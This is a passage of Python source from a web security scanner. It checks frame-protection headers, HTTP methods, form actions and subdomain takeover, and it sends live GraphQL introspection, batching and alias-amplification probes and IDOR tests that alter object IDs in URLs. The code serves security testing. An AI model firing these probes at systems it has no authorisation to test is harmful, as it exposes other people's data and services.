        """Scan for clickjacking exposure and missing frame protection."""
        findings = []
        target = self.config.get("target", "")
        try:
            resp = safe_get(self.session, target, self.timeout, raise_for_status=False)
            if not resp:
                return findings

            x_frame = resp.headers.get("X-Frame-Options", "").lower()
            csp = resp.headers.get("Content-Security-Policy", "").lower()

            allows_frame = not any(directive in csp for directive in CLICKJACKING_SAFE_DIRECTIVES)
            missing_protection = not x_frame and allows_frame

            if missing_protection:
                f = finding(
                    "Clickjacking Exposure",
                    target,
                    "medium",
                    (
                        "The application does not enforce frame protection headers or "
                        "CSP frame-ancestors. Add X-Frame-Options or frame-ancestors."
                    ),
                    f"X-Frame-Options: {x_frame or 'missing'}, CSP: {csp or 'missing'}",
                    confidence="confirmed",
                )
                if f and self._add(f):
                    findings.append(f)
                log(f"  [CLICKJACKING] {target}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
        except Exception as e:
            log(f"  [CLICKJACKING] Error scanning target: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        return self._deduplicate(findings)

    # ── HTTP Method Exposure ─────────────────────────────────────────────────────

    def scan_http_methods(self) -> list[dict]:
        """Scan for dangerous HTTP methods exposed by the server."""
        findings = []
        target = self.config.get("target", "")
        try:
            resp = self.session.options(target, timeout=self.timeout)
            if not resp:
                return findings

            allow_header = resp.headers.get("Allow", "")
            cors_methods = resp.headers.get("Access-Control-Allow-Methods", "")
            methods = set(self._normalize_list(allow_header) + self._normalize_list(cors_methods))
            dangerous = {"TRACE", "PUT", "DELETE", "PATCH", "PROPFIND"}
            exposed = [m for m in methods if m.upper() in dangerous]

            if exposed:
                f = finding(
                    "Dangerous HTTP Methods Enabled",
                    target,
                    "medium",
                    (
                        "The server supports non-safe HTTP methods that may increase attack surface. "
                        "Disable TRACE, PUT, DELETE, and PATCH if not required."
                    ),
                    f"Allowed methods: {', '.join(sorted(methods))}",
                    confidence="confirmed",
                )
                if f and self._add(f):
                    findings.append(f)
                log(f"  [HTTP METHODS] {target} -> {', '.join(exposed)}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
        except Exception as e:
            log(f"  [HTTP METHODS] Error scanning methods: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        return self._deduplicate(findings)

    # ── Insecure Forms ───────────────────────────────────────────────────────────

    def scan_insecure_forms(self) -> list[dict]:
        """Scan forms for insecure action URLs and cross-origin password submission."""
        findings = []
        for form in self.recon.get("forms", []):
            try:
                method = form.get("method", "get").lower()
                action = form.get("action", "")
                if not action or method != "post":
                    continue

                parsed = urlparse(action)
                if parsed.scheme == "http":
                    f = finding(
                        "Insecure Form Action",
                        action,
                        "high",
                        "A POST form submits sensitive data over an insecure HTTP connection. Use HTTPS.",
                        "Form action uses http:// scheme",
                        confidence="confirmed",
                    )
                    if f and self._add(f):
                        findings.append(f)
                    log(f"  [FORM] {action}", Colors.RED, verbose_only=True, verbose=self.verbose)
                    continue

                if any(field.get("type") == "password" for field in form.get("fields", [])):
                    if parsed.netloc and not self._same_origin(action):
                        f = finding(
                            "Password Form Cross-Origin Submission",
                            action,
                            "high",
                            (
                                "A password field is submitting to a different origin than the target. "
                                "Submit credentials only to the same trusted origin."
                            ),
                            f"Action host: {parsed.netloc}",
                            confidence="confirmed",
                        )
                        if f and self._add(f):
                            findings.append(f)
                        log(f"  [FORM] {action}", Colors.RED, verbose_only=True, verbose=self.verbose)
            except Exception as e:
                log(f"  [FORM] Error analyzing form: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        return self._deduplicate(findings)

    # ── Subdomain Takeover Detection ───────────────────────────────────────────

    def scan_subdomain_takeover(self) -> list[dict]:
        """Scan discovered subdomains for takeover fingerprints."""
        findings = []
        for subdomain in self.recon.get("subdomains", []):
            try:
                for scheme in ("http://", "https://"):
                    target_url = f"{scheme}{subdomain}"
                    resp = safe_get(self.session, target_url, self.timeout, raise_for_status=False)
                    if not resp or not resp.text:
                        continue

                    body = resp.text
                    for signature in TAKEOVER_SIGNATURES:
                        if signature.lower() in body.lower():
                            f = finding(
                                "Subdomain Takeover",
                                target_url,
                                "high",
                                (
                                    "A known takeover fingerprint was detected on the subdomain. "
                                    "Remove unused DNS entries or provision the missing service."
                                ),
                                f"Signature: {signature}",
                                confidence="probable",
                            )
                            if f and self._add(f):
                                findings.append(f)
                            log(f"  [TAKEOVER] {target_url}", Colors.RED, verbose_only=True, verbose=self.verbose)
                            raise StopIteration
            except StopIteration:
                continue
            except Exception as e:
                log(f"  [TAKEOVER] Error checking {subdomain}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        return self._deduplicate(findings)

    # ── GraphQL ────────────────────────────────────────────────────────────────

    def scan_graphql(self) -> list[dict]:
        """Probe common GraphQL endpoints for introspection and amplification risks."""
        findings = []
        endpoints = ["/graphql", "/api/graphql", "/nerdgraph/graphql", "/v1/graphql", "/query"]
        headers = {"Content-Type": "application/json"}
        introspection = {"query": "{ __schema { types { name } } }"}
        batch_payload = [{"query": "{ __typename }"}] * 50

        for ep in endpoints:
            url = self.base_url + ep
            try:
                r = self.session.post(url, json=introspection, headers=headers, timeout=self.timeout)
                if r.status_code == 200 and "__schema" in r.text:
                    self._record_confirmed(
                        findings,
                        "GraphQL Introspection Enabled",
                        url,
                        "medium",
                        "Full schema is exposed via introspection.",
                        "__schema",
                        "POST",
                        introspection,
                    )
            except Exception:
                continue

            try:
                r = self.session.post(url, json=batch_payload, headers=headers, timeout=self.timeout)
                if r.status_code == 200 and isinstance(r.json(), list) and len(r.json()) > 1:
                    self._record_confirmed(
                        findings,
                        "GraphQL Query Batching Unrestricted",
                        url,
                        "medium",
                        "Server accepts batched GraphQL arrays with no apparent limit.",
                        "__typename",
                        "POST",
                        batch_payload,
                    )
            except Exception:
                pass

            alias_query = {"query": "{ " + " ".join([f'q{i}: __typename' for i in range(100)]) + " }"}
            try:
                r = self.session.post(url, json=alias_query, headers=headers, timeout=self.timeout)
                if r.status_code == 200 and "q99" in r.text:
                    self._record_confirmed(
                        findings,
                        "GraphQL Alias Amplification",
                        url,
                        "medium",
                        "Server does not limit query aliases.",
                        "q99",
                        "POST",
                        alias_query,
                    )
            except Exception:
                pass

        return self._deduplicate(findings)

    # ── IDOR ───────────────────────────────────────────────────────────────────

    def scan_idor(self) -> list[dict]:
        """Detect potential IDOR by mutating discovered object references."""
        findings = []
        id_patterns = [
            (re.compile(r"[?&](account|accountId|account_id|user|userId|user_id|org|orgId|org_id|id|guid|uuid|ref)=([0-9a-f\-]{4,36})", re.IGNORECASE), "param"),
            (re.compile(r"/(accounts|users|orgs|organisations|entities)/([0-9a-f\-]{4,36})", re.IGNORECASE), "path"),
        ]
        uuid_pattern = re.compile(r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$", re.IGNORECASE)
        candidates = []

        for url in self.recon.get("urls", []):
            for pattern, ref_type in id_patterns:
                for m in pattern.finditer(url):
                    candidates.append({"url": url, "param": m.group(1), "value": m.group(2), "type": ref_type})

        seen = set()
        for c in candidates:
            key = (c["param"], c["value"])
            if key in seen:
                continue
            seen.add(key)
            original_val = c["value"]
            original_url = c["url"]
            baseline = safe_get(self.session, original_url, self.timeout, raise_for_status=False)
            if not baseline:
                continue

            if original_val.isdigit():
                for delta in [-1, 1, -100, 100]:
                    test_val = str(int(original_val) + delta)
                    test_url = original_url.replace(original_val, test_val, 1)
                    r = safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                    if r and r.status_code == 200 and len(r.text) > 500 and abs(len(r.text) - len(baseline.text)) < 5000 and r.text != baseline.text:
                        details = f"Param '{c['param']}' changed from {original_val} to {test_val} and returned non-identical content."
                        evidence = r.text[:120]
                        self._record_confirmed(findings, "Potential IDOR - Numeric ID Manipulation", test_url, "high", details, evidence)

            if uuid_pattern.match(original_val):
                null_uuid = "00000000-0000-0000-0000-000000000000"
                test_url = original_url.replace(original_val, null_uuid, 1)
                r = safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                if r and r.status_code == 200 and len(r.text) > 500:
                    details = f"Replacing UUID in '{c['param']}' with null UUID returned HTTP 200 with content."
                    evidence = r.text[:120]
                    self._record_confirmed(findings, "Potential IDOR - Null UUID Accepted", test_url, "medium", details, evidence)

        return self._deduplicate(findings)

    # ── Main scan orchestration ───────────────────────────────────────────────────

    def run_all(self) -> list[dict]:
        """Execute all vulnerability scans."""
        try:
            log("  [scanner] Starting vulnerability scans...", Colors.CYAN, verbose_only=True, verbose=self.verbose)
            
            # Run all scans (can be parallelized if needed)
            self.scan_xss()
            self.scan_sqli()
            self.scan_lfi()
            self.scan_ssrf()
            self.scan_open_redirect()
            self.scan_headers()
            
            log(f"  [scanner] Found {len(self.findings)} vulnerabilities", Colors.CYAN, verbose_only=True, verbose=self.verbose)
            return self.findings
            
        except Exception as e:
            log(f"  [scanner] Fatal error during scanning: {e}", Colors.RED, verbose_only=True, verbose=self.verbose)
            return self.findings
